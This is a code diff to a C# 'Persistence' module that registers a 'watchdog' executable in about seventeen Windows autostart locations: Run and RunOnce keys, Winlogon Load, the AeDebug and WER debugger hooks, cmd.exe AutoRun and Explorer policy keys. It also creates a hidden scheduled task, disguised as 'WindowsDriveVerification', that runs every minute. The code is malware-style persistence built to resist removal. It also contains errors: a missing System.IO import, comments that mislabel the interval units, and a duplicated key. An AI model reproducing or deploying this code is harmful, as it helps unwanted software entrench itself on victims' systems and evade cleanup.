@@ -1,5 +1,7 @@
 using System;
 using System.Diagnostics;
+using Microsoft.Win32;
+
 
 namespace Persistence
 {
@@ -8,29 +10,29 @@ namespace Persistence
 
         public static void runAllTechniques()
         {
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Config.PrimaryWatchdogFullPath); // Run Keys on startup
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Config.PrimaryWatchdogFullPath);
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Config.PrimaryWatchdogFullPath);
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Config.PrimaryWatchdogFullPath);
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath);
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Config.PrimaryWatchdogFullPath);
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Run", Config.PrimaryWatchdogFullPath);
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Config.PrimaryWatchdogFullPath);
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows", "Load", Config.PrimaryWatchdogFullPath);
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Config.PrimaryWatchdogFullPath);
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Config.PrimaryWatchdogFullPath);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunServices", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunServices", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "Run", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", "Load", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
 
 
 
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug\", "Debugger", Config.PrimaryWatchdogFullPath); //relies on application crash
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs\", "Debugger", Config.PrimaryWatchdogFullPath); //relies on application crash
+            SetRegistryKey(@"Software\Microsoft\Windows NT\CurrentVersion\AeDebug\", "Debugger", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //relies on application crash
+            SetRegistryKey(@"Software\Microsoft\Windows\Windows Error Reporting\Hangs\", "Debugger", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //relies on application crash
 
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Command Processor\", "AutoRun", Config.PrimaryWatchdogFullPath); //Runs when cmd.exe starts
+            SetRegistryKey(@"Software\Microsoft\Command Processor\", "AutoRun", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser); //Runs when cmd.exe starts
 
 
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "BackupPath", Config.PrimaryWatchdogFullPath); //These three are Windows background processes
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "cleanuppath", Config.PrimaryWatchdogFullPath);
-            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "DefragPath", Config.PrimaryWatchdogFullPath);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "BackupPath", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //These three are Windows background processes
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "cleanuppath", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
+            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "DefragPath", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
 
 
             string taskName = "WindowsDriveVerification";
@@ -39,46 +41,91 @@ namespace Persistence
             if (!TaskExistsAndActive(taskName))
             {
                 // Create or re-enable the task if it doesn't exist or is inactive
-                CreateScheduledTask(taskName, Config.PrimaryWatchdogFullPath, 30); // Runs every 30 minutes
+                CreateScheduledTask(taskName, Config.PrimaryWatchdogFullPath, 1); // Runs every 1 minute
                 Console.WriteLine($"Scheduled task '{taskName}' created or re-enabled successfully.");
             }
             else
             {
                 Console.WriteLine($"Scheduled task '{taskName}' already exists and is active.");
+
             }
         }
 
-        static bool TaskExistsAndActive(string taskName)
-        {
-            Process process = new Process();
-            process.StartInfo.FileName = "schtasks";
-            process.StartInfo.Arguments = $"/Query /TN \"{taskName}\" /V /FO LIST";
-            process.StartInfo.RedirectStandardOutput = true;
-            process.StartInfo.UseShellExecute = false;
-            process.StartInfo.CreateNoWindow = true;
+            static bool TaskExistsAndActive(string taskName)
+            {
+                Process process = new Process();
+                process.StartInfo.FileName = "schtasks";
+                process.StartInfo.Arguments = $"/Query /TN \"{taskName}\" /V /FO LIST";
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.CreateNoWindow = true;
 
-            process.Start();
-            string output = process.StandardOutput.ReadToEnd();
-            process.WaitForExit();
+                process.Start();
+                string output = process.StandardOutput.ReadToEnd();
+                process.WaitForExit();
 
-            // Check if the task exists and is active
-            return output.Contains(taskName) && output.Contains("Status: Ready");
-        }
+                // Check if the task exists and is active
+                return output.Contains(taskName) && output.Contains("Status: Ready");
+            }
 
-        // Function to create a scheduled task to run every 30 seconds
-        static void CreateScheduledTask(string taskName, string binaryPath, int intervalSeconds)
-        {
-            // Create the schtasks command to run every 30 seconds
-            string command = $"/Create /TN \"{taskName}\" /TR \"{binaryPath}\" /SC ONCE /ST 00:00 /F /RI {intervalSeconds} /DU 9999:59";
+            // Function to create a scheduled task to run every 30 seconds
+            static void CreateScheduledTask(string taskName, string binaryPath, int intervalSeconds)
+            {
+                // Create the schtasks command to run every 30 seconds
+                string command = $"/Create /TN \"{taskName}\" /TR \"{binaryPath}\" /SC ONCE /ST 00:00 /F /RI {intervalSeconds} /DU 9999:59";
 
-            Process process = new Process();
-            process.StartInfo.FileName = "schtasks";
-            process.StartInfo.Arguments = command;
-            process.StartInfo.UseShellExecute = false;
-            process.StartInfo.CreateNoWindow = true;
+                Process process = new Process();
+                process.StartInfo.FileName = "schtasks";
+                process.StartInfo.Arguments = command;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.CreateNoWindow = true;
 
-            process.Start();
-            process.WaitForExit();
-        }
+                process.Start();
+                process.WaitForExit();
+            }
+
+            public static void SetRegistryKey(string keyPath, string valueName, object value, RegistryHive hive, RegistryView view = RegistryView.Default)
+            {
+                try
+                {
+                    using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, view))
+                    {
+                        using (RegistryKey key = baseKey.OpenSubKey(keyPath, true) ?? baseKey.CreateSubKey(keyPath, true))
+                        {
+                            if (key != null)
+                            {
+                                object currentValue = key.GetValue(valueName);
+                                if (currentValue == null || !currentValue.Equals(value))
+                                {
+                                    key.SetValue(valueName, value);
+                                }
+                            }
+                            else
+                            {
+                                throw new IOException($"Failed to create or open registry key: {keyPath}");
+                            }
+                        }
+                    }
+                }
+                catch (UnauthorizedAccessException ex)
+                {
+                    LogError($"Access denied to registry key: {keyPath}. Exception: {ex.Message}");
+                }
+                catch (IOException ex)
+                {
+                    LogError($"I/O error accessing registry key: {keyPath}. Exception: {ex.Message}");
+                }
+                catch (Exception ex)
+                {
+                    LogError($"Unexpected error: {ex.Message}");
+                }
+            }
+
+            private static void LogError(string message)
+            {
+                // Log to a file, event log, or other logging mechanism
+                Console.WriteLine($"[ERROR] {message}");  // Example logging
+            }
+        
     }
 }
